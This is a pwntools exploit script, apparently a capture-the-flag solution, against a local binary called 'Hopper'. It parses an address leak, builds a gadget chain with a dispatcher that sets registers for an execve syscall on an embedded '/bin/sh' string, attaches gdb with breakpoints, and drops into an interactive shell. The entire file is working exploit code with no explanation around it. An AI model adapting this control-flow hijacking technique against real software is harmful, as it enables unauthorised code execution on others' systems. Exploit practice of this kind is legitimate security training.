#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./Hopper',checksec=False)

p = process()
p.recv(0x17A)
p.recvline()
leak = u64(p.recv(6).ljust(8,b'\x00'))
bin_sh_addr = leak + 8 * 6
print("leak: ",hex(leak))
gadget_chain = 0x401017
dispatcher_addr = 0x401011
xor_rsi = 0x401027
xchg_rax_r13 = 0x40100c
xor_rdx = 0x401021
syscall = 0x40100a
gdb.attach(p,gdbscript='''
          b*0x0000000000401033
          b*0x0000000000401069
           ''')
payload = p64(gadget_chain)
payload += p64(bin_sh_addr)         # rdi
payload += p64(leak)            # rbx
payload += p64(0x3b)                # r13 (later rax)
payload += p64(dispatcher_addr)     # r15 dispatcher
payload += p64(xor_rsi)             # clear rsi
payload += p64(xchg_rax_r13)        # swap rax and r13
payload += p64(xor_rdx)             # clear rdx
payload += p64(syscall)             # syscall
payload += b'/bin/sh\x00'
input()
sleep(3)
p.sendline(payload)

p.interactive()
